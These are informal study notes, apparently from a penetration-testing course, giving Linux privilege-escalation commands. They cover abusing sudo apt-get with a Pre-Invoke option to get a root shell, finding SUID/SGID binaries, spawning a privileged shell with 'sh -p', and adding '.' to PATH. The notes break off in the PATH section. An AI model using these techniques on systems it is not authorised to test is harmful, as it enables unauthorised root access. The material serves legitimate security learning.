### GWAP GWAP GWAP
```bash
man xfreerdp
xfreerdp /u:<USER> /p:<PAS> /v:<IP>
```
### SUDO DEMO
```bash
1.) List sudo permissions
sudo -l
#Output:
User demo1 may run the following commands on stu:
    (root) /usr/bin/apt-get
# Utilize GTFObins, to view ways we can leverage certain commands. 
#We discovered this:
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
#This gave us a shell AS ROOOOOOT
*You must be in an interactive shell to use sudo
```
### SUID/SGID
```bash
# Any file that has SUID set
find / -type f -perm /4000 -ls  2>/dev/null

# Any file that has SGID set
find / -type f -perm /2000 -ls  2>/dev/null

#Both SUID and SGID SET
find / -type f -perm /6000 -ls  2>/dev/null

# GTFOBins to find what we want to use
#From an absolute path, utilize the bin we found that has suid.
#Ex: /home/demo1/nice /bin/sh -p
# waooow we have root
```
### . in PATH
```bash
echo $PATH
PATH=.:$PATH

